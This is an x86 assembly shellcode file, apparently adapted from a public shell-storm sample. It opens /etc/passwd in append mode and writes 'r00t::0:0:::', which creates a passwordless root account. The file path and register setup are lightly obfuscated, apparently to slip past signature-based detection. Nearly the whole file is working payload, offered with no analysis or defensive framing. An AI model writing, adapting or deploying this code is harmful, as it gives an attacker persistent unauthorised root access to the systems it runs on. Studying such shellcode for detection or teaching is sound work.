; add_r00t.nasm
; From shellstorm sample: http://shell-storm.org/shellcode/files/shellcode-211.php


global _start

section .text
_start:

    ; reset registers (w/ mild obfuscation)
    mov ebx, 0x9e2aab3e
    add ebx, 0x61d554c2
    mul ebx                 ; sets EBX=0, EDX=0
    mov ecx, eax
    
    ; open("/etc//passwd", O_WRONLY | O_APPEND)
    
    push edx            ; push NULL
    push 0x64777373     ; "dwss"
    push 0x9e8fd0d0     ; NOT("ap//")
    push 0x6374652f     ; "cte/"
    mov ebx, esp
    mov cx, 02001Q 
    mov al, 0x05
    not dword [esp+4]   ; decode middle 4 bytes of the filepath string
    int 0x80

    mov ebx, eax        ; store file handle in EBX for later use
    
    
    ; write(ebx, "r00t::0:0:::", 12)

    mov eax, edx        ; reset EAX
    push eax
    push 0x3a3a3a30     ; "r00t::0..."
    push 0x3a303a3a     ;
    push 0x74303072     ;
    mov ecx, esp        ; pointer to "r00t::0..." string on stack
    mov dl, 0xC  
    mov al, 0x04
    int 0x80


    ; close(ebx)
    xor eax, eax
    mov al, 0x06        ; close syscall
    int 0x80
   

    ; exit()
    mov al, 0x01
    int 0x80
    
    
     
